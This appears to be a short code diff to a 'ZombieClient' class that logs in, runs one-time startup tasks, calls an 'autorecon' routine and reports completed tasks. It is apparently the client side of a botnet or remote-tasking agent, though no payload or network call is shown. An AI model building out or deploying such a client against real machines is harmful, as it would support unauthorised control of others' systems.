@@ -15,6 +15,10 @@ class ZombieClient:
         logger.log('zombie is waking up...', 'INFO')
         pass
 
+    def do_startup_tasks(self):
+        # startup tasks are executed one time after succesful login
+        machine.startup_tasks()
+
     def keep_logged_in(self):
         token.keep_logged_in()
 
@@ -27,10 +31,16 @@ class ZombieClient:
     def post_completed_tasks(self):
         task_manager.post_completed_tasks()
 
+
     def run(self):
+
+        machine.autorecon()
+
         if config.autosetup():
             while not token.login():
                 sleep(config.read_setting('inet_unreach_retry'))
+
+            self.do_startup_tasks()
 
             threads=[]
 
